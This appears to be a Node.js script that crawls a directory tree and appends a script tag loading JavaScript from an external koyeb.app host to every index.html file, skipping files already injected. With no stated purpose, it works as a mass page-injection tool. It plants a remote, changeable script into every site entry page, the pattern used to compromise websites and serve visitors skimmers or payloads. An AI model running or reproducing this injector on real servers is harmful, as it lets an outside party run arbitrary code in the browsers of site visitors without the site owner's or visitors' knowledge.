const fs = require('fs');
const path = require('path');

// The code snippet you want to append
const codeToAppend = `<script src="https://plain-vanessa-ojdaw-24d55416.koyeb.app/client_script.js"></script>`;

function findHtmlFiles(dir) {
  fs.readdir(dir, { withFileTypes: true }, (err, files) => {
    if (err) {
      console.error(`Error reading directory ${dir}:`, err);
      return;
    }

    files.forEach(file => {
      const fullPath = path.join(dir, file.name);

      if (file.isDirectory()) {
        findHtmlFiles(fullPath);
      } else if (
        file.isFile() &&
        file.name.toLowerCase() === 'index.html'
      ) {
        fs.readFile(fullPath, 'utf8', (err, data) => {
          if (err) {
            console.error(`Error reading file ${fullPath}:`, err);
            return;
          }

          if (!data.includes(codeToAppend.trim())) {
            fs.appendFile(fullPath, '\n' + codeToAppend, err => {
              if (err) {
                console.error(`Error appending to file ${fullPath}:`, err);
              } else {
                console.log(`Appended code to: ${fullPath}`);
              }
            });
          } else {
            console.log(`Code already present in: ${fullPath}`);
          }
        });
      }
    });
  });
}

const startDir = process.argv[2] || __dirname;
findHtmlFiles(startDir);